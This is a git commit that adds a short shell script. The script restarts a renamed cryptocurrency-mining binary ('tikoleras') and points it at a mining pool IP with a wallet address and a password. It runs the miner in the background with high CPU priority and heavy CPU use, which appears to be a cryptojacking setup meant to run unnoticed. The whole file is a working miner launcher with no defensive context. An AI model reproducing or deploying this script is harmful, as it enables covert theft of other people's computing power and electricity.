c7f5d1a6765a7a3361ff99b3fc95619f071853bb
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-05-15 18:48:55 +0800

    Add files via upload

---
+++ 80.sh
@@ -0,0 +1,3 @@
+pkill tikoleras
+sleep 7
+tikoleras -o 95.216.143.25:4222 -u 44X3tNzFXwZet6y87T1R61gqzBZ9f4yMH9ur4baLxTeEDnfkyJKqRcTEtkqXMfZ6BhTqB8jgYSP5YRbtjAEHRjeqBozqe29 --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=87 --av=1 --variant -1
